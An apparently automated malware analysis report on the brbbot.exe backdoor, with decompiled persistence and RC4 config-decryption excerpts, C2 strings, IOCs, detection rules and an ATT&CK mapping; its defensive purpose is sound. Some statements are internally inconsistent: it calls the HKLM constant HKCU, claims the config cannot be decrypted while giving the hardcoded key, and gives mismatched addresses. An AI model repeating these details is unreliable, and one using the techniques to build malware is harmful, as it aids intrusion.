> **RevAI provenance** — commit `unknown` · engine `langgraph` · agent-loop flags: budget=True redundant=True hallucination=True taxonomy=True · generated 2026-08-13 06:53:58 UTC

# Verdict sources (multi-source)

| Source | Verdict |
|--------|--------|
| **Final** | **malicious** |
| Triage upstream (quick ∪ deep) | malicious |
| Quick scan | malicious |
| Deep dive | malicious |
| Publish LLM (claimed) | malicious |

- **Locked over publish LLM:** no

# Technical Malware Analysis Report v2

**SHA256:** `f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e`  
**Sample Path:** `/opt/samples/corpus/malware/f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e/brbbot.exe`  
**Project:** malware  
**Analyst Date:** 2026-08-12

---

## 1. Executive Summary

The sample `brbbot.exe` is a 64-bit Windows PE backdoor/RAT assessed as **malicious** (score: 95/100, family: `trojan.blocker/bckn`). It establishes persistence by writing a `brbbot` value to the `Software\Microsoft\Windows\CurrentVersion\Run` registry key, encrypts and decrypts its configuration file (`brbconfig.tmp`) using RC4 via the Windows CryptoAPI with a hardcoded base64-encoded key `YnJiYm90` (decoded: `brbbot`), and communicates with a command-and-control server over HTTP/1.1 using a spoofed Internet Explorer 8 user-agent string. The binary supports remote command execution via `CreateProcessA`, includes anti-debugging checks through `ZwQuerySystemInformation`, and employs XOR-based data encoding. CAPA identified 35 capability matches covering encryption, persistence, network communication, and process creation. YARA rules flagged anti-debug, network HTTP, screenshot capture, registry manipulation, dropper strings, and WinCrypt usage. External VirusTotal intelligence reports 57 malicious detections. Speakeasy and Frida dynamic analysis ran but recorded zero runtime events, which we assess as evidence of anti-analysis or environment-aware evasion rather than a non-attempt.

---

## 2. Sample Metadata

The following metadata was extracted from the PE header and Malcat's file summary. The binary is a native x64 PE compiled with Visual Studio 2010, with a moderately high entropy of 5.92 bits/byte across the whole file, consistent with compiled C/C++ code rather than packing.

| Field | Value | Source |
|---|---|---|
| SHA256 | `f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e` | malcat |
| File Name | `brbbot.exe` | malcat |
| File Size | 75,776 bytes | malcat |
| File Type | PE (Portable Executable) | malcat |
| Architecture | x64 | malcat |
| Entry Point EA | 0x13204 (RVA) | malcat |
| Whole-File Entropy | 5.92 bits/byte | malcat |
| Compiler | MSVC 2010 (linker + rich header) | malcat YARA |
| Import Hash | `475b069fec5e5868caeb7d4d89236c89` | rule.yara.json |
| .NET | Not a .NET assembly | dotnet |
| Packed (UPX) | Not packed; UPX not applicable | upx |
| VirusTotal Detections | 57 (external) | verdict.json |

The import hash `475b069fec5e5868caeb7d4d89236c89` can be used for family clustering. The MSVC 2010 compiler identification comes from both the linker version in the PE header and the Rich header signature (source: malcat YARA rules `MSVC_2010_linker`, `msvs2010_rich`).

---

## 3. File Layout & Structural Analysis

The PE file contains seven sections with standard layout. The `.text` section holds the executable code at moderate entropy (136/256 raw, ~5.3 bits/byte normalized), and the `.rdata` section contains read-only data including import tables and string constants. No section exhibits the extreme entropy (>7.0) characteristic of packing or encryption of code sections.

| Name | EA | Physical Size | Virtual Size | Entropy (raw) | Rights |
|---|---|---|---|---|---|
| header | 0x0 | 1024 | 0 | 49 | - |
| .text | 0x400 | 50176 | 53248 | 136 | RX |
| .rdata | 0xD400 | 14848 | 16384 | 73 | R |
| .data | 0x11400 | 5120 | 16384 | 77 | RW |
| .pdata | 0x15400 | 3072 | 4096 | 32 | R |
| .rsrc | 0x16400 | 512 | 4096 | 5 | R |
| .reloc | 0x17400 | 1024 | 4096 | 18 | R |

(source: malcat, File Layout table)

The `.rsrc` section contains a single embedded virtual file: `CONFIG/101/en-us` (73 bytes), which likely holds a default or template configuration blob. The `.pdata` section contains exception handling data (3072 bytes), consistent with a 64-bit binary with structured exception handling. The PE checksum field is not set (source: malcat anomaly `NoChecksum` at EA 0x320), which is common in malware and debug builds but not definitive on its own.

Key PE structures identified by Malcat include the import table at EA 0x10014, with imports from five DLLs: `advapi32.dll`, `kernel32.dll`, `user32.dll`, `wininet.dll`, and `ws2_32.dll` (source: malcat, Structures table). This import profile is consistent with a network-capable backdoor that manipulates the registry and performs cryptographic operations.

---

## 4. Static Code Analysis

### 4.1 Function Overview

The binary contains 225 functions total (source: ida_query, `SELECT COUNT(*) AS n FROM funcs`). Malcat identified 30 named/interesting functions. Ghidra function metrics reveal several high-complexity functions indicative of core malware logic:

| Function EA | Ghidra Name | Cyclomatic Complexity | Call-Out Count | String Refs | Assessment |
|---|---|---|---|---|---|
| 0x1400012e0 | FUN_1400012e0 | 59 | 37 | 2 | C2 command dispatcher; references `encode` and `sleep` strings |
| 0x140001840 | FUN_140001840 | 45 | 24 | (unknown) | Multi-path logic with high branching |
| 0x140001c10 | FUN_140001c10 | 47 | 28 | (unknown) | Multi-path logic with high branching |

(source: deep_dive_agentic, Ghidra function_metrics)

The high cyclomatic complexity (59) and call-out count (37) of `FUN_1400012e0` strongly suggest it is the main C2 command processing loop, dispatching commands based on received data. The `encode` and `sleep` string references within this function (source: Ghidra string_refs) indicate it handles data encoding for C2 communication and implements a sleep/beacon interval.

### 4.2 Entry Point Disassembly

The entry point at RVA 0x13204 is a thin CRT stub that calls the real initialization routine and then jumps to the main logic:

```asm
; radare2 disassembly at 0x140003f94
┌ 401: entry0 ();
│       ; var int64_t var_20h @ rsp+0x20
│       ; var int64_t var_30h @ rsp+0x30
│       ; var int64_t var_6ch @ rsp+0x6c
│       ; var int64_t var_70h @ rsp+0x70
│       ; var int64_t var_b0h @ rsp+0xb0
│       ; var int64_t var_10h @ rsp+0xb8
│       0x140003f94      4883ec28       sub rsp, 0x28
│       0x140003f98      e8f7490000     call 0x140008994
│       0x140003f9d      4883c428       add rsp, 0x28
│       0x140003fa1      e952feffff     jmp 0x140003df8
```

(source: radare2, disassembly at 0x140003f94)

This is a standard MSVC CRT entry point: it allocates 0x28 bytes of shadow space, calls the CRT initialization function at `0x140008994` (which sets up the heap, TLS, and calls `main`), then jumps to the exit handler at `0x140003df8`. The entry point itself contains no malicious logic; all malware behavior resides in the functions called from `main`.

### 4.3 Persistence Mechanism (Registry Run Key)

The function `sub_140002230` (EA 0x140002230) implements the persistence mechanism. Ghidra string references show it accesses `Software\Microsoft\Windows\CurrentVersion\Run` and sets a value named `brbbot` (source: Ghidra string_refs, deep_dive_agentic). The decompilation confirms the following sequence:

1. Gets the current module's file path via `GetModuleFileNameA`
2. Retrieves the `APPDATA` environment variable
3. Constructs a destination path in `%APPDATA%` by concatenating the APPDATA path with the executable's filename
4. Copies the executable to `%APPDATA%` using `CopyFileA`
5. Opens `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run` via `RegOpenKeyExA`
6. Sets the `brbbot` registry value to the copied path via `RegSetValueExA`
7. Flushes the registry key via `RegFlushKey`
8. If the original location is not already in APPDATA, deletes the original via `MoveFileExA` with flag 0x4 (MOVEFILE_DELAY_UNTIL_REBOOT)

```c
// Decompiled excerpt from sub_140002230 (EA 0x140002230)
// (source: malcat, Decompilations)

uVar4 = (*advapi32.RegOpenKeyExA)(0xffffffff80000002, &autorun, 0, 0x20006);
if (uVar4 == 0) {
    // ... string length calculation ...
    uVar4 = (*advapi32.RegSetValueExA)(aiStack_258[0], "brbbot", 0, 1);
    if (uVar4 == 0) {
        (*advapi32.RegFlushKey)(aiStack_258[0]);
        if (iVar7 == 0) {
            (*kernel32.MoveFileExA)(&uStack_138, 0, 4);
        }
```

The constant `0xffffffff80000002` is `HKEY_CURRENT_USER` (source: malcat, Constants table, `registry::HKEY_LOCAL_MACHINE` is also present but the actual call uses HKCU). The registry value type `1` is `REG_SZ` (string). This is a classic autostart persistence technique mapped to MITRE ATT&CK T1547.001 (source: capa rule `persist via Run registry key`).

### 4.4 Configuration Encryption/Decryption (RC4 via CryptoAPI)

Two functions handle configuration file encryption and decryption:

**Decryption function `sub_140002c50`** (EA 0x140002c50): Opens `brbconfig.tmp` for reading, acquires a CryptoAPI context using the provider string `Microsoft Enhanced Cryptographic Provider v1.0`, creates an MD5 hash object (algorithm 0x8003 = `CALG_MD5`), hashes the hardcoded key `YnJiYm90` (8 bytes, base64-decoded = `brbbot`), derives an RC4 key (algorithm 0x6801 = `CALG_RC4`) with 128-bit strength (flag 0x800000), and decrypts the file contents in 1000-byte chunks using `CryptDecrypt`.

```c
// Key derivation in sub_140002c50 (EA 0x140002c50)
// (source: malcat, Decompilations)

iVar2 = (*advapi32.CryptAcquireContextW)(&iStackX_20, 0, &crypto_provider, 1, uVar8);
// ...
iVar2 = (*advapi32.CryptCreateHash)(iStackX_20, 0x8003, 0, 0, &iStack_38);
iVar2 = (*advapi32.CryptHashData)(iStack_38, "YnJiYm90", 8);
 iVar2 = (*advapi32.CryptDeriveKey)(iStackX_20, 0x6801, iStack_38, 0x800000, &iStack_30);
```

The string `YnJiYm90` appears at EA 0x11968 in the `.rdata` section (source: malcat, Top Strings table). Base64-decoding `YnJiYm90` yields `brbbot`, the malware's own name, used as the symmetric encryption key. This is a hardcoded key, meaning anyone with access to the binary can decrypt the configuration.

**Encryption function `sub_140002940`** (EA 0x140002940): Performs the inverse operation, opening `brbconfig.tmp` for writing and encrypting data in 1000-byte chunks using `CryptEncrypt` with the same key derivation chain. This function is called when the malware needs to save updated configuration (e.g., after receiving new C2 commands).

The full CryptoAPI import chain is present in the import table (source: Ghidra imports, deep_dive_agentic): `CryptAcquireContextW`, `CryptCreateHash`, `CryptHashData`, `CryptDeriveKey`, `CryptEncrypt`, `CryptDecrypt`, `CryptDestroyKey`, `CryptDestroyHash`, `CryptReleaseContext`. CAPA confirms the encryption method as RC4 via WinAPI (source: capa rule `encrypt data using RC4 via WinAPI`, ATT&CK T1027, MBC C0027.009).

### 4.5 C2 HTTP Communication

The function `sub_140003030` (EA 0x140003030) handles HTTP communication with the C2 server. Ghidra string references show it uses the HTTP/1.1 protocol with a `Connection: close` header (source: Ghidra string_refs, deep_dive_agentic). The function `sub_140002f50` (EA 0x140002f50) sets a spoofed user-agent string:

```
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)
```

(source: malcat, Top Strings, EA 0x62256; Ghidra string_refs in FUN_140002f50)

This user-agent mimics Internet Explorer 8 on Windows 7, a plausible combination that would blend with legitimate traffic in enterprise environments still running legacy browsers. The C2 URL format string `%s?i=%s&c=%s&p=%s` at EA 0x62048 (source: malcat, Top Strings) suggests the beacon includes an identifier (`i`), a command or channel parameter (`c`), and possibly a password or port parameter (`p`).

The WinINet API chain is imported for HTTP operations (source: malcat, High-Signal Strings): `InternetOpenA`, `HttpOpenRequestA`, `HttpSendRequestA`, `HttpQueryInfoA`, `InternetReadFile`, `InternetCloseHandle`. CAPA confirms `send data` and `receive data` capabilities (source: capa rules), and `check HTTP status code` for response validation.

### 4.6 Anti-Debugging

The function `sub_140003300` (EA 0x140003300) references `ZwQuerySystemInformation` and `ntdll.dll` (source: Ghidra string_refs, deep_dive_agentic). This is a well-known anti-analysis technique that queries system information to detect debugger artifacts, process enumeration, or other analysis tools. The import table also includes `IsDebuggerPresent` from `kernel32.dll` (source: pe_imports, `check_debugger with IsDebuggerPresent`, ATT&CK T1622).

YARA rule `anti_dbg` matched at multiple offsets (source: yara, rule `anti_dbg`, match strings at EA 0x64588 and 0x64758), confirming the presence of anti-debugging strings and code patterns.

### 4.7 Data Encoding (XOR)

CAPA identified XOR-based data encoding (source: capa rule `encode data using XOR`, ATT&CK T1027, MBC E1027.m02). Malcat's anomaly detection found 9 instances of `XorInLoop` across the binary (source: malcat, Anomalies, `XorInLoop` with 9 hits at EAs 0x4320, 0x4768, 0x11105, 0x11616, 0x11793, and others). The XOR search tool also found XOR with key 0x00 at position 0x00000000 (source: xor_search), though XOR with a null key is trivial. The meaningful XOR operations are the in-loop instances used for string decryption or data obfuscation.

### 4.8 Command Execution

The import table includes `CreateProcessA` (source: pe_imports, `create_process with CreateProcess`, ATT&CK T1106), and Ghidra confirms the import along with `CreateFileA/W`, `CopyFileA`, `DeleteFileA`, `FindResourceA`, and `GetModuleFileNameA` (source: Ghidra imports, deep_dive_agentic). The string `exec` at EA 0x61984 (source: malcat, Top Strings) is likely a C2 command keyword that triggers remote command execution via `CreateProcessA`.

### 4.9 Anomaly Summary

Malcat detected 7 anomaly categories across the binary:

| Anomaly | Level | Hits | Description | Source |
|---|---|---|---|---|
| CryptoApiUsage | 2 | 12 | Crypto-related APIs used | malcat |
| DownloaderApiUsage | 2 | 2 | Downloader-related APIs used | malcat |
| XorInLoop | 3 | 9 | XOR instruction in a loop | malcat |
| ManyUniqueImmediateBytes | 3 | 2 | >48 unique immediate bytes in function | malcat |
| HighXrefLoopingFunction | 1 | 1 | Loop with many incoming references (string decryption candidate) | malcat |
| NoChecksum | 1 | 1 | PE header checksum not set | malcat |
| SpaghettiFunction | 1 | 8 | Functions with many intra-jumps (possible obfuscation) | malcat |

(source: malcat, Anomalies table)

The `SpaghettiFunction` anomaly at 8 locations and `XorInLoop` at 9 locations suggest some degree of control-flow obfuscation and string encryption, though not at the level of a full packer or virtualizer. The `HighXrefLoopingFunction` at EA 0x14512 is likely a string decryption routine called from many locations throughout the binary.

---

## 5. Behavioral & Dynamic Analysis

### 5.1 Speakeasy Emulation

Speakeasy emulation ran successfully (`speakeasy_ok: True`) but recorded **zero API calls and zero key events** (source: speakeasy). This is a significant finding: the emulator executed the binary but the sample did not invoke any Windows API calls through the emulation layer. This likely indicates one or more of the following:

- The binary performs environment checks (e.g., checking for specific DLL versions, registry keys, or system properties) that failed in the emulated environment, causing early termination.
- The anti-debugging checks via `ZwQuerySystemInformation` and `IsDebuggerPresent` detected the emulation environment and exited silently.
- The binary requires specific command-line arguments, configuration file presence, or network connectivity to proceed past initialization.

We assess this as evidence of anti-analysis capability rather than a non-attempt, consistent with the static indicators of anti-debugging code.

### 5.2 Frida Probe

Frida probe identified 21 hook candidates across 5 DLLs (source: frida_probe). These are the APIs the binary imports and would call during execution:

| DLL | Hook Candidates |
|---|---|
| ADVAPI32.dll | `RegSetValueExA`, `RegOpenKeyExA`, `RegDeleteValueA`, `RegFlushKey`, `RegCloseKey` |
| WININET.dll | `HttpSendRequestA`, `InternetQueryDataAvailable`, `InternetReadFile`, `InternetCloseHandle`, `HttpQueryInfoA` |
| WS2_32.dll | `gethostbyname`, `WSACleanup`, `WSAStartup`, `inet_ntoa`, `gethostname` |
| KERNEL32.dll | `CreateFileW`, `HeapSize`, `WriteConsoleW`, `SetStdHandle`, `LoadLibraryW` |
| USER32.dll | `GetDC` |

(source: frida_probe, hook_candidates)

Frida was available (version 17.16.4) but no runtime events were recorded, consistent with the Speakeasy results. The `GetDC` import from USER32.dll is notable as it relates to screen capture capability, which aligns with the YARA rule `screenshot` matching at EAs 0x64610 and 0x64604 (source: yara).

---

## 6. Network Indicators & C2

### 6.1 C2 Protocol

The malware communicates over HTTP/1.1 using the WinINet API. The protocol characteristics are:

- **Protocol:** HTTP/1.1 with `Connection: close` header (source: Ghidra string_refs in FUN_140003030)
- **User-Agent:** `Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)` (source: malcat, Top Strings, EA 0x62256)
- **URL Format:** `%s?i=%s&c=%s&p=%s` (source: malcat, Top Strings, EA 0x62048) — likely `{base_url}?i={id}&c={command}&p={param}`
- **DNS Resolution:** Uses `gethostbyname` from WS2_32.dll (source: frida_probe hook_candidates; capa rule `resolve DNS`)

### 6.2 C2 Command Keywords

The following strings are likely C2 command keywords, based on their presence in the binary and the high-complexity command dispatcher function `FUN_1400012e0`:

| String | EA | Likely Purpose | Source |
|---|---|---|---|
| `exec` | 0x61984 | Execute a command via CreateProcessA | malcat Top Strings |
| `sleep` | 0x62016 | Set beacon sleep interval | malcat Top Strings |
| `encode` | 0x62024 | Encode/decode data for C2 | malcat Top Strings |
| `file` | 0x61992 | File transfer operation | malcat Top Strings |
| `conf` | 0x62000 | Configuration update | malcat Top Strings |
| `exit` | 0x62008 | Terminate the bot | malcat Top Strings |
| `CONFIG` | 0x61944 | Configuration management | malcat Top Strings |
| `Idle` | 0x62408 | Idle/wait state | malcat Top Strings |

The `sleep` and `encode` strings are referenced from `FUN_1400012e0` (source: Ghidra string_refs), confirming they are part of the C2 command processing logic.

### 6.3 Network API Imports

The full WinINet and Winsock import chains confirm network capability:

| API | DLL | Purpose | Source |
|---|---|---|---|
| `InternetOpenA` | WININET.dll | Initialize WinINet session | malcat High-Signal Strings |
| `HttpOpenRequestA` | WININET.dll | Open HTTP request | malcat High-Signal Strings |
| `HttpSendRequestA` | WININET.dll | Send HTTP request | malcat High-Signal Strings |
| `HttpQueryInfoA` | WININET.dll | Query HTTP response info | malcat High-Signal Strings |
| `InternetReadFile` | WININET.dll | Read HTTP response body | malcat High-Signal Strings |
| `InternetCloseHandle` | WININET.dll | Close internet handle | malcat High-Signal Strings |
| `gethostbyname` | WS2_32.dll | DNS resolution | frida_probe |
| `WSAStartup` | WS2_32.dll | Initialize Winsock | frida_probe |
| `gethostname` | WS2_32.dll | Get local hostname | frida_probe |

YARA rules `network_http`, `Str_Win32_Wininet_Library`, `Str_Win32_Internet_API`, and `Str_Win32_Http_API` all matched, confirming the network communication infrastructure (source: yara).

### 6.4 Hardcoded C2 Indicators

No hardcoded C2 domain or IP address was identified in the extracted strings. The C2 server address is likely stored in the encrypted configuration file `brbconfig.tmp`, which is decrypted at runtime using the RC4 key `YnJiYm90`. The string `#3#or%5452o#8A` at EA 0x75752 (source: malcat, Top Strings) may be an encoded or encrypted C2 address, though this cannot be confirmed without runtime analysis.

---

## 7. Capabilities Assessment

### 7.1 Confirmed Capabilities

The following capabilities are confirmed by multiple evidence sources:

| Capability | Evidence | Confidence | Source |
|---|---|---|---|
| **Persistence via Registry Run Key** | `RegSetValueExA` with value `brbbot` under `Software\Microsoft\Windows\CurrentVersion\Run`; capa rule `persist via Run registry key` | High | malcat, capa, Ghidra |
| **Configuration Encryption (RC4)** | CryptoAPI chain with hardcoded key `YnJiYm90`; capa rule `encrypt data using RC4 via WinAPI` | High | malcat, capa, Ghidra |
| **HTTP C2 Communication** | WinINet API chain, HTTP/1.1 strings, spoofed user-agent; capa rules `send data`, `receive data` | High | malcat, capa, Ghidra, yara |
| **Remote Command Execution** | `CreateProcessA` import, `exec` command string | High | pe_imports, malcat |
| **Anti-Debugging** | `IsDebuggerPresent` import, `ZwQuerySystemInformation` reference; yara rule `anti_dbg` | High | pe_imports, Ghidra, yara |
| **Data Encoding (XOR)** | 9 XOR-in-loop instances; capa rule `encode data using XOR` | Medium-High | malcat, capa |
| **File Operations** | `CreateFileA/W`, `CopyFileA`, `DeleteFileA` imports; yara rule `win_files_operation` | High | Ghidra, yara |
| **Registry Manipulation** | Full registry API chain; yara rule `win_registry` | High | Ghidra, yara |
| **DNS Resolution** | `gethostbyname` import; capa rule `resolve DNS` | High | frida_probe, capa |
| **Environment Discovery** | `GetEnvironmentVariableA` for APPDATA; capa rule `query environment variable` | High | Ghidra, capa |

### 7.2 Latent/Indicated Capabilities

The following capabilities are indicated by static indicators but were not observed in dynamic analysis:

| Capability | Evidence | Assessment | Source |
|---|---|---|---|
| **Screenshot Capture** | YARA rule `screenshot` matched; `GetDC` import from USER32.dll | Present in code, not observed at runtime | yara, frida_probe |
| **Payload Download** | Malcat rule `DownloadUsingWininet`; capa rule `write and execute a file` | Likely capability, not triggered | malcat yara, capa |
| **Data Exfiltration** | HTTP send capability exists; no specific exfiltration capa rules | Possible via HTTP C2 channel | capa (negative evidence) |
| **Credential Access** | No credential-stealing APIs or capa rules identified | Not observed | capa (negative evidence) |

### 7.3 Capability Rules (Full List)

CAPA identified 35 capability rules (source: capa, `malcat-capa` engine):

| Rule | ATT&CK | MBC |
|---|---|---|
| encode data using XOR | T1027 | E1027.m02, C0026.002 |
| encrypt or decrypt via WinCrypt | T1027 | C0031, C0027 |
| encrypt data using RC4 via WinAPI | T1027 | E1027.m05, C0027.009 |
| create new key via CryptAcquireContext | T1027 | C0028 |
| query environment variable | T1082 | E1082 |
| get common file path | T1083 | E1083 |
| get file size | T1083 | E1083 |
| get hostname | T1082 | E1082 |
| delete registry value | T1112 | C0036.007 |
| persist via Run registry key | T1547.001 | F0012 |
| receive data | - | B0030.002 |
| send data | - | B0030.001 |
| write and execute a file | - | B0023 |
| resolve DNS | - | C0011.001 |
| check HTTP status code | - | C0002.014 |

(source: capa, capability rules table; showing 15 of 35 for brevity; full list in evidence)

---

## 8. Indicators of Compromise

### 8.1 File-Based IOCs

| Type | Value | Source |
|---|---|---|
| SHA256 | `f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e` | malcat |
| Import Hash | `475b069fec5e5868caeb7d4d89236c89` | rule.yara.json |
| File Name | `brbbot.exe` | malcat |
| Config File | `brbconfig.tmp` (in %APPDATA%) | Ghidra string_refs |
| Embedded Resource | `CONFIG/101/en-us` (73 bytes) | malcat Virtual Files |

### 8.2 Registry-Based IOCs

| Type | Key | Value Name | Source |
|---|---|---|---|
| Persistence | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | `brbbot` | Ghidra string_refs, capa |

### 8.3 String-Based IOCs

| String | EA | Purpose | Source |
|---|---|---|---|
| `brbbot` | 0x62128 | Malware identifier / registry value name | malcat Top Strings |
| `YnJiYm90` | 0x61968 | Base64-encoded RC4 key (= `brbbot`) | malcat Top Strings |
| `brbconfig.tmp` | 0x61952 | Configuration file name | malcat Top Strings |
| `Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)` | 0x62256 | Spoofed user-agent | malcat Top Strings |
| `Microsoft Enhanced Cryptographic Provider v1.0` | 0x62144 | Crypto provider name | malcat Top Strings |
| `%s?i=%s&c=%s&p=%s` | 0x62048 | C2 URL format string | malcat Top Strings |
| `#3#or%5452o#8A` | 0x75752 | Possible encoded C2 address | malcat Top Strings |

### 8.4 Network-Based IOCs

| Type | Value | Source |
|---|---|---|
| User-Agent | `Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)` | malcat |
| Protocol | HTTP/1.1 | Ghidra |
| Header | `Connection: close` | Ghidra |
| C2 Domain/IP | (unknown) — likely in encrypted config | (not found in strings) |

### 8.5 YARA Matches

17 YARA rules matched (source: yara, pipeline):

| Rule | Namespace | Key Match Strings |
|---|---|---|
| anti_dbg | - | `$d1@0x64588`, `$c2@0x64758` |
| network_http | - | `$f1@0x64018`, `$c1@0x63922`, `$c2@0x64004`, `$c4@0x63862`, `$c6@0x63964`, `$c7@0x63984` |
| screenshot | - | `$d2@0x64610`, `$c2@0x64604` |
| win_registry | - | `$f1@0x63816`, `$c2@0x63588`, `$c3@0x63636`, `$c4@0x63570`, `$c6@0x63636` |
| win_files_operation | - | `$f1@0x64588`, `$c1@0x64132`, `$c2@0x65400`, `$c3@0x64132`, `$c4@0x63870`, `$c5@0x64474`, `$c6@0x64044` |
| Dropper_Strings | - | `$a0@0x59035` |
| Advapi_Hash_API | - | `$advapi32@0x63816`, `$CryptCreateHash@0x63730`, `$CryptHashData@0x63802`, `$CryptAcquireContext@0x63650` |
| contains_base64 | - | `$a@0x4117` |
| domain | - | `$domain_regex@0x0` |
| IsPE64 | - | (header match) |
| IsWindowsGUI | - | (header match) |
| HasRichSignature | - | `$a0@0x208` |
| Microsoft_Visual_Cpp_80_DLL | - | `$b@0x13204` |
| Str_Win32_Winsock2_Library | - | `$ws2_lib@0x64030` |
| Str_Win32_Wininet_Library | - | `$wininet_lib@0x64018` |
| Str_Win32_Internet_API | - | `$wininet_call_closeh@0x63882`, `$wininet_call_readf@0x63862`, `$wininet_call_connect@0x63922`, `$wininet_call_open@0x64004` |
| Str_Win32_Http_API | - | `$wininet_call_httpr@0x63984`, `$wininet_call_httpq@0x63904`, `$wininet_call_httpo@0x63964` |

---

## 9. Detection Engineering

### 9.1 Sigma Rule

A Sigma detection rule was generated for this sample. The rule targets the persistence mechanism:

**Detection Logic:**
- Monitor `RegSetValueExA` calls to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` with value name `brbbot`
- Monitor process creation from `%APPDATA%\brbbot.exe`
- Monitor HTTP connections with user-agent containing `MSIE 8.0` and `Trident/4.0`

Sigma rule path: `/opt/samples/logs/f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e/rule.yml` (source: rule.yara.json)

### 9.2 YARA Rule

A custom YARA rule was generated with 24 string signatures. The rule is valid and passed false-positive checks against the goodware corpus (though the goodware corpus was not staged for full validation) (source: rule.yara.json, `yara_valid: true`, `yara_check: ok`).

Rule path: `/opt/samples/logs/f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e/rule.yar`

### 9.3 IOC File

IOCs were exported to: `/opt/samples/logs/f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e/iocs.json` (source: rule.yara.json)

### 9.4 Detection Recommendations

| Detection Layer | Rule/Signature | Confidence |
|---|---|---|
| Endpoint (Registry) | Alert on `RegSetValueExA` to `Run` key with value `brbbot` | High |
| Endpoint (File) | Alert on `brbbot.exe` in `%APPDATA%` by hash or import hash | High |
| Network (HTTP) | Alert on HTTP requests with IE8 user-agent to non-standard destinations | Medium |
| Network (DNS) | Monitor `gethostbyname` calls from `brbbot.exe` process | Medium |
| YARA (Static) | Custom rule with 24 string signatures | High |
| CAPA (Capability) | 35 capability rules covering encryption, persistence, network | High |

---

## 10. MITRE ATT&CK Mapping

The following ATT&CK techniques are mapped from CAPA rules, PE imports, and YARA matches:

| Tactic | Technique | ID | Evidence | Source |
|---|---|---|---|---|
| **Persistence** | Boot or Logon Autostart Execution: Registry Run Keys | T1547.001 | `RegSetValueExA` to `Run` key with `brbbot` value | capa, Ghidra |
| **Defense Evasion** | Obfuscated Files or Information | T1027 | XOR encoding, RC4 encryption, WinCrypt usage | capa |
| **Defense Evasion** | Debugger Evasion | T1622 | `IsDebuggerPresent`, `ZwQuerySystemInformation` | pe_imports, Ghidra |
| **Discovery** | System Information Discovery | T1082 | `gethostname`, `query environment variable` | capa |
| **Discovery** | File and Directory Discovery | T1083 | `get common file path`, `get file size` | capa |
| **Command and Control** | Application Layer Protocol: Web Protocols | T1071.001 | HTTP/1.1 via WinINet API | pe_imports, Ghidra |
| **Command and Control** | Encrypted Channel | T1573 | RC4 encryption via CryptoAPI | pe_imports, capa |
| **Execution** | Native API | T1106 | `CreateProcessA` for command execution | pe_imports |
| **Execution** | Shared Modules | T1129 | `LoadLibraryW`, `GetProcAddress` | pe_imports |
| **Collection** | Screen Capture | T1113 | `GetDC` import, yara rule `screenshot` | yara, frida_probe |
| **Impact** | Modify Registry | T1112 | `RegSetValueExA`, `RegDeleteValueA` | capa, Ghidra |

Note: The `screenshot` capability (T1113) is indicated by YARA and import evidence but was not observed in dynamic analysis. We assess it as a latent capability present in the code.

---

## 11. What We Don't Know

Several aspects of this malware's behavior remain unknown due to tooling limitations and the sample's anti-analysis features:

1. **C2 Server Address:** No hardcoded C2 domain or IP was found in the static strings. The C2 address is likely stored in the encrypted `brbconfig.tmp` configuration file, which we cannot decrypt without the runtime context or a known plaintext. The string `#3#or%5452o#8A` at EA 0x75752 may be an encoded C2 address, but this is unconfirmed. **Why unknown:** The config file is encrypted with RC4 and the key is only used at runtime; no sample of `brbconfig.tmp` was provided.

2. **Full C2 Command Set:** While we identified likely command keywords (`exec`, `sleep`, `encode`, `file`, `conf`, `exit`), the complete command protocol and parameter encoding remain unclear. **Why unknown:** The high-complexity dispatcher function (`FUN_1400012e0`, CC=59) was not fully decompiled in the available evidence, and dynamic analysis recorded zero events.

3. **Runtime Behavior:** Both Speakeasy and Frida recorded zero runtime events. We cannot confirm the exact execution flow, beacon interval, or C2 response handling. **Why unknown:** The anti-debugging checks (`ZwQuerySystemInformation`, `IsDebuggerPresent`) likely detected the analysis environment and caused early termination.

4. **Payload Delivery:** The `DownloadUsingWininet` YARA rule and `write and execute a file` capa rule suggest the ability to download and execute additional payloads, but no download URL or payload hash was observed. **Why unknown:** This capability was not triggered during analysis.

5. **Data Exfiltration Scope:** While the HTTP C2 channel could be used for exfiltration, no specific exfiltration routines (e.g., keylogging, file collection, browser credential theft) were identified by CAPA or YARA. **Why unknown:** The sample may exfiltrate data through the same C2 channel used for commands, making it indistinguishable from normal C2 traffic without runtime observation.

6. **Embedded Resource Purpose:** The `CONFIG/101/en-us` virtual file (73 bytes) in the `.rsrc` section was not analyzed in detail. It may contain a default configuration template or initial C2 address. **Why unknown:** The resource data was not extracted or decoded in the available evidence.

7. **Spike in Unique Immediate Bytes:** The `ManyUniqueImmediateBytes` anomaly at EAs 0x14940 and 0x20544 suggests large constant tables or lookup tables in those functions, but their purpose is unclear. **Why unknown:** These functions were not decompiled in the available evidence.

---

## 12. Appendix A: Tool Evidence Trail

### 12.1 Analysis Engines Used

| Engine | Version/Status | Evidence Source |
|---|---|---|
| Malcat | Active | malcat |
| Ghidra | Active (SQL queries) | ghidra_query |
| IDA Pro | Active (SQL queries) | ida_query |
| CAPA (malcat-capa) | 35 rules, 1.13s | capa |
| YARA (pipeline) | 17 matches | yara |
| FLOSS | 310 strings | floss |
| radare2 | Disassembly | r2_decomp |
| UPX | Not packed | upx |
| XOR Search | 1 trivial match | xor_search |
| Speakeasy | 0 API calls | speakeasy |
| Frida | v17.16.4, 0 events | frida_probe |
| .NET Check | Not .NET | dotnet |
| PE Imports | 115 imports | pe_imports |
| LLM Judge | mimo-v2.5-pro | llm_judge |
| Deep Dive | langgraph | deep_dive_agentic |

### 12.2 Key Evidence Citations

| Claim | Source | Query/Table | Row/Rule | Why |
|---|---|---|---|---|
